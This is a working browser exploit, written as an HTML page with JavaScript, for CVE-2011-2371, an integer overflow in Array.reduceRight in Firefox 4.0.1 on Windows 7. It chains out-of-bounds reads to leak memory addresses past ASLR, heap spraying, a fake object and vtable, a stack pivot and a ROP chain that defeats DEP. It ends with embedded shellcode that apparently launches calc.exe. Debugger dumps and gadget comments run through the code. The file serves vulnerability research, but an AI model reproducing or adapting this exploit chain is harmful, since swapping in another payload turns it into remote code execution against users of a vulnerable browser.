<!--

Exploiting CVE-2011-2371

Mozilla Firefox 4.0.1
Windows 7 Professional, Service Pack 1
ASLR + DEB enabled

Integer overflow in 'arr.reduceRight()' while assigning unsigned integer to signed integer:

> jsuint length = ... ;
> jsint end = length;

Patch: https://bugzilla.mozilla.org/attachment.cgi?id=539075&action=edit

//-->

<html>
<body>
<script src = "jspack.js"></script>
<script>
  var jsp = new JSPack();
  /*
  leak_arr starts at eax
    0:000> dd eax - 40
        06595050  00000000 00000000 00000000 00000000
        06595060  00000000 00000000 68ca5cac 68ca5fb0 <- mozjs.dll pointer
        06595070  00000000 ffffffff 00000000 0658e348 <- heap pointer
        06595080  0658e0a0 fffffffb 00000008 06595090
eax ->  06595090  00000000 ffff0004 00000000 ffff0004
        065950a0  00000000 ffff0004 00000000 ffff0004
        065950b0  00000000 ffff0004 00000000 ffff0004
        065950c0  00000000 ffff0004 00000000 ffff0004
    
    hex((0xffffffff * 8 + 0x06595090)%0x100000000) = '0x6595088'
    hex((0xfffffffe * 8 + 0x06595090)%0x100000000) = '0x6595080'
    
    leak_arr[-3] -> heap pointer
    leak_arr[-5] -> mozjs.dll pointer
    
    i.e., if length = 0xfffffffe, we can leak leak_arr[-3], etc.
  */
  var leak_arr = new Array;
  leak_arr[0] = 0x40414140;
  var leak_arr2 = new Array;
  leak_arr2[0] = 0x42424242;
  leak_arr.length = 0xfffffffe;
  var counter = 0;
  var heap_leak;
  var mozjs_leak;
  
  // Will be called from leak_arr[-3], leak_arr[-4] ...
  function leak_func(prev, current, index, array) {
    // current will be our leak
    switch(counter++) {
      case 0: // heap_leak
        var bytes = jsp.Pack("d", [current]);
        var addr = jsp.Unpack(">L>L", bytes);
        heap_leak = addr[0];
        break;
      case 2: // mozjs.dll leak
        var bytes = jsp.Pack("d", [current]);
        var addr = jsp.Unpack(">L>L", bytes);
        mozjs_leak = addr[0];
        throw "Leak over"; // No need to leak further
    }
  } 
  
  // Triggering reduceRight integer overflow
  try {
    leak_arr.reduceRight(leak_func, 1, 2, 3);
  } catch (e) {}
  
  alert("Heap leak1: " + heap_leak.toString(16));
  alert("mozjs.dll leak: " + mozjs_leak.toString(16));
  
  var mozjs_base = mozjs_leak - 0x68305fb0 + 0x68150000;
  
  /* Heap spraying to clean up holes */
  var spray = new Array();
  for (var i = 0;i<150;i++) {
    spray[i] = new Uint32Array(128);
    for (var j = 0;j<128;j++) {
      spray[i][j] = 0x41414141;
    }
  }
  
  /* Crafting fake object */
  var fake_obj = new Uint32Array(128);
  fake_obj[0] = 0x42434342;
  for (var i = 1;i<127;i++) {
    fake_obj[i] = 0x43444443;
  }
  fake_obj[127] = 0x44454544;
  
  /* Reallocating the original leak array just after our fake object */
  leak_arr[63] = 0x45464645;
  
  /*
        
  0:000> dd eax - 70
                  (second ptr && leak_arr)
  04019ab0  00000040 12211400 40414140 ffff0001
  04019ac0  00000000 ffff0004 00000000 ffff0004
  04019ad0  00000000 ffff0004 00000000 ffff0004
  04019ae0  00000000 ffff0004 00000000 ffff0004
  04019af0  00000000 ffff0004 68ca5cac 68ca5fb0
  04019b00  00000000 ffffffff 00000000 040123c0
  04019b10  040120a0 fffffffe 00000008 04019b20
  04019b20  42424242 ffff0001 00000000 ffff0004
  
  0xfffffffe -> 040123c000000000
  0xfffffff3 -> 00000040 12211400
  */
  // leak_arr2 will be just after header of leak_arr, hence we can leak the second heap pointer
  var heap_leak2;
  function leak_func2(prev, current, index, array) {
    var bytes = jsp.Pack("d", [current]);
    var addr = jsp.Unpack(">L>L", bytes);
    heap_leak2 = addr[0];
    throw "Leak over"; // Stop leaking
  }
  
  leak_arr2.length = 0xfffffff3;
  // Triggering the second leak
  try {
    leak_arr2.reduceRight(leak_func2, 1, 2, 3);
  } catch (e) {}
  
  alert("Heap leak2: " + heap_leak2.toString(16));

  /* Contents of fake_obj */
  fake_obj[2] = heap_leak2 - 0x6bf1000 + 0x6bf0e10;
  fake_obj[3] = 0xffff0007; // JSVAL_TAG_OBJECT
  
  
  /* 
  Stack pivoting gadget
  0x6816a21c :  # ADD EBP,EBX # PUSH DS # POP EDI # POP ESI # POP EBX # MOV ESP,EBP # POP EBP # RETN    ** [mozjs.dll] **   |   {PAGE_EXECUTE_READ}
  */
  var ebp_setter_gadget = mozjs_base + 0x1a21c;
  /*
  Stack align gadget
  */
  var stack_align_gadget = mozjs_base + 0x1a1b0;
  
  new_ebp = fake_obj[2] + 6*4;
  
  // Fake vtable

  fake_obj[5] = fake_obj[2] + 8 - 0x64;
  fake_obj[6] = ebp_setter_gadget;
  fake_obj[7] = 0xaaaaaaaa;
  fake_obj[8] = new_ebp << 8;
  fake_obj[9] = (new_ebp >> 8*3) | (stack_align_gadget << 8);
  fake_obj[10] = stack_align_gadget >> 8*3;
  
  /* ROP to disable DEP */
  
  /*
  Register setup for VirtualProtect() :
  --------------------------------------------
   EAX = NOP (0x90909090)
   ECX = lpOldProtect (ptr to W address)
   EDX = NewProtect (0x40)
   EBX = dwSize
   ESP = lPAddress (automatic)
   EBP = ReturnTo (ptr to jmp esp)
   ESI = ptr to VirtualProtect()
   EDI = ROP NOP (RETN)
   --- alternative chain ---
   EAX = tr to &VirtualProtect()
   ECX = lpOldProtect (ptr to W address)
   EDX = NewProtect (0x40)
   EBX = dwSize
   ESP = lPAddress (automatic)
   EBP = POP (skip 4 bytes)
   ESI = ptr to JMP [EAX]
   EDI = ROP NOP (RETN)
   + place ptr to "jmp esp" on stack, below PUSHAD
  */
  var index = 11;
  
  //rop chain generated with mona.py - www.corelan.be
  fake_obj[index++] = mozjs_base + 0x00064e3c,  // POP EAX # RETN [mozjs.dll]
  fake_obj[index++] = mozjs_base + 0x0015d054,  // ptr to &VirtualAlloc() [IAT mozjs.dll]
  fake_obj[index++] = mozjs_base + 0x0002855d;  // MOV EAX,DWORD PTR DS:[EAX] # RETN [mozjsdll] 
  fake_obj[index++] = mozjs_base + 0x0014293c;  // XCHG EAX,ESI # RETN [mozjsdll] 
  fake_obj[index++] = mozjs_base + 0x00009216;  // POP EBP # RETN [mozjsdll] 
  fake_obj[index++] = mozjs_base + 0x0000c8b2;  // & push esp # ret  [mozjsdll]
  fake_obj[index++] = mozjs_base + 0x0002f246;  // POP EBX # RETN [mozjsdll] 
  fake_obj[index++] = 0x00000001;               // 0x00000001-> ebx
  fake_obj[index++] = mozjs_base + 0x0004f422;  // POP EDX # RETN [mozjsdll] 
  fake_obj[index++] = 0x00001000;               // 0x00001000-> edx
  fake_obj[index++] = mozjs_base + 0x00061677;  // POP ECX # RETN [mozjsdll] 
  fake_obj[index++] = 0x00000040;               // 0x00000040-> ecx
  fake_obj[index++] = mozjs_base + 0x000e84b3;  // POP EDI # RETN [mozjsdll] 
  fake_obj[index++] = mozjs_base + 0x00156519;  // RETN (ROP NOP) [mozjsdll]
  fake_obj[index++] = mozjs_base + 0x000c95f6;  // POP EAX # RETN [mozjsdll] 
  fake_obj[index++] = 0x90909090;               // nop
  fake_obj[index++] = mozjs_base + 0x001372bd;  // PUSHAD # RETN [mozjsdll]
  
  // Execution will jump to stack

  var shellcode = "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"
  // Align shellcode to multiple of 4 bytes with NOPs
  while(shellcode.length % 4 != 0) { 
    shellcode += "\x90";
  }
  for(i = 0; i < shellcode.length; i += 4) {
    fake_obj[index] = 0;
    fake_obj[index] += shellcode[i+3].charCodeAt(0) << (8*3);
    fake_obj[index] += shellcode[i+2].charCodeAt(0) << (8*2);
    fake_obj[index] += shellcode[i+1].charCodeAt(0) << (8*1);
    fake_obj[index] += shellcode[i+0].charCodeAt(0) << (8*0);
    index++;
  }
  
  // Getting reference to the fake_object from leak_arr
  var fake_obj_ref;
  
  function get_fake_obj(prev, current, index, array) {
    fake_obj_ref = current;
    throw "Got object";
  }
  
  leak_arr.length = 0xffffffc2;
  
  try {
    alert("Creating fake object");
    leak_arr.reduceRight(get_fake_obj, 1, 2, 3);
  } catch (e) {}
  
  alert("Triggering vtable call");
  /* 
  68bf01a9 8b4764          mov     eax,dword ptr [edi+64h] ds:0023:deadbf52=????????

  $edi -> fake_obj[5]
  
  68bf01a9 8b4764          mov     eax,dword ptr [edi+64h]
  68bf01ac 85c0            test    eax,eax
  68bf01ae 7505            jne     mozjs!js_SetTraceableNativeFailed+0x5e65 (68bf01b5)
  68bf01b0 b830bbb568      mov     eax,offset mozjs!js_CheckUndeclaredVarAssignment+0x760 (68b5bb30)
  68bf01b5 8b54241c        mov     edx,dword ptr [esp+1Ch]
  68bf01b9 6a00            push    0
  68bf01bb 8d4c2424        lea     ecx,[esp+24h]
  68bf01bf 51              push    ecx
  68bf01c0 53              push    ebx
  68bf01c1 55              push    ebp
  68bf01c2 52              push    edx
  68bf01c3 ffd0            call    eax
  */
  fake_obj_ref[8] = 0;
</script>
</body>
</html>